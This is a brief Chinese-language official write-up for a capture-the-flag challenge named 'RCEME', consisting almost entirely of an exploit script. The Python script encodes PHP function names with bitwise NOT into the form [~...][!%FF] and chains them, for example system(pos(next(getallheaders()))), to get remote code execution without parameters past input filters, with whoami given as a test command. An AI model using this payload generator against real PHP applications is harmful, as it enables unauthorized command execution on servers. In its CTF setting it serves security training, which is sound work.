# RCEME 官方wp

这里直接丢个exp,考点其实是`[~(异或)][!%FF]`的形式组成字符串,然后无参数RCE

```php
def one(s):
    ss = ""
    for each in s:
        ss += "%" + str(hex(255 - ord(each)))[2:].upper()
    return f"[~{ss}][!%FF]("

"""
组成类似于system(pos(next(getallheaders())));即可
a=whoami
"""
while 1:
    a = input(":>").strip(")")
    aa = a.split("(")
    s = ""
    for each in aa[:-1]:
        s += one(each)
    s += ")" * (len(aa) - 1) + ";"
    print(s)

```

